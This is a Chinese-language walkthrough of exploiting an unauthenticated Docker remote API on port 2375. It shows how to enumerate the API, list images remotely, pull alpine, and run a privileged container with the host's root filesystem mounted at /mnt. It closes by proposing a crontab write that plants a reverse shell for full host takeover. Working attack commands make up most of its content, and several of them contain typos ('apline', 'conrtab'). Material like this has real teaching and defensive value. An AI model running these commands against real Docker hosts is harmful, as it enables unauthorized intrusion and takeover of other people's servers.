# docker-未授权访问

我们去访问ip:2375，当出现page not found时表明2375端口存在该漏洞

![1714400003738-db65832e-e9e7-44f4-ae2f-87969a448293.png](/uploads/20260518/b255115f-8e3d-4297-8bf4-0676c867fcd4.png)

我们继续访问ip:2375/version,环境版本等信息

![1714400019887-6c239a25-cf01-4ae8-b176-a37d47eeceb6.png](/uploads/20260518/e3b657fe-fb5e-4a86-b4fa-55faa983d996.png)

ip:2375/info，获得当前的info目录info是安全目录

![1714400032286-72302662-9f1b-4473-bc64-1e254eba0d19.png](/uploads/20260518/c920982b-9695-45a1-8c65-c9a39cb21031.png)

ip:2375/images/json，获取当前的image

![1714400046672-1babb21e-2d7a-4cb0-8d24-08cd4541e95e.png](/uploads/20260518/db44c71d-0088-4409-9aff-4fa88d44e09f.png)

因为docker存在远程连接命令，又因为2375端口的暴露，便可以未授权访问，这个时候我们就能使用kali直接远程连接docker

我们使用docker -H tcp://ip images 列出当前存在的镜像,也可以使用docker -H tcp://ip ps -a 查看当前的镜像文件

![1714400070850-1345e521-e1c6-49fc-9815-ff2edd905791.png](/uploads/20260518/59d4f4f6-dab5-415c-9f2f-5d684a8dabdd.png)

![1714400075441-b7571dd2-6ed0-43e9-83c5-3238c4acedb0.png](/uploads/20260518/c3042577-aa2f-48d9-b6e7-98d9adb48b2d.png)

我们进入环境里面查看是否和我在kali上看到的镜像文件一致

![1714400088641-d319a8e4-b15e-41bb-911d-abbc6343fad2.png](/uploads/20260518/43ad28ce-db38-48ed-8e38-e9404916e272.png)

我们下载镜像文件alpine

```plain
docker -H tcp://ip:2375 pull apline
```

![1714400107382-3d8b7b0b-138c-43fc-b94b-dc11c2b7ccb8.png](/uploads/20260518/25bd2fc2-d546-48af-a31e-4fcf9f5deccc.png)

我们这个时候使用特权模式启动这个alpine容器

```plain
docker -H tcp://ip:2375 run -it --privileged alpine /bin/sh
```

![1714400141834-0cd6f1b9-4fb5-45e8-84dd-d67e661e8e56.png](/uploads/20260518/a0d4529d-036b-47eb-b5df-b0de82f38bc9.png)

将宿主机磁盘挂载到创建好的目录中便能达到逃逸

也可以直接将磁盘在运行镜像时直接挂载到mnt目录下

```plain
docker -H tcp://ip:2375 run -it -v /:/mnt apline /bin/sh
```

![1714400165847-e21e9e7c-9e15-4a28-b6a0-620e077f6170.png](/uploads/20260518/b0d2bec7-4bda-4e08-bbda-2d1cb38642d8.png)

我们进入mnt目录下，便能发现以及把宿主机的磁盘挂载到了mnt中

![1714400183744-31674eb4-c4fa-4b2a-946b-e43b3f09565f.png](/uploads/20260518/48c86364-8406-4c74-989e-f5838d3c6c32.png)

我们这个时候想/mnt/etc/conrtab中写入计划任务进行反弹shell便能达到获得宿主机权限
